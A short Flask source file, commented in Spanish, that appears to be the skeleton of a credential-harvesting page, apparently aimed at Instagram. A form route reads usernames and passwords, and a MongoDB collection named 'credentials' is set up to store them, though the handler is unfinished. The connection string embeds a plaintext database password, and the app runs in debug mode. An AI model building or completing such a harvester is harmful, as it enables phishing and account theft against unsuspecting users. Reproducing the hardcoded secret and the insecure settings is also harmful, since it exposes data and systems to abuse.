from flask import Flask, request, render_template, jsonify
#import instaloader
import pymongo
from pymongo import MongoClient

app = Flask(__name__)

# Conexión con la base de datos MongoDB
client = MongoClient("mongodb+srv://jhonmerk:JonDeere123!?@cluster0.kpdju.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
db = client.mydatabase
collection = db.credentials  # Colección donde se almacenarán las credenciales

# Ruta para la página principal
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para el procesamiento del formulario
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

#if __name__ == '__main__':
 #   app.run(port=5001)
if __name__ == '__main__':
    app.run(debug=True)
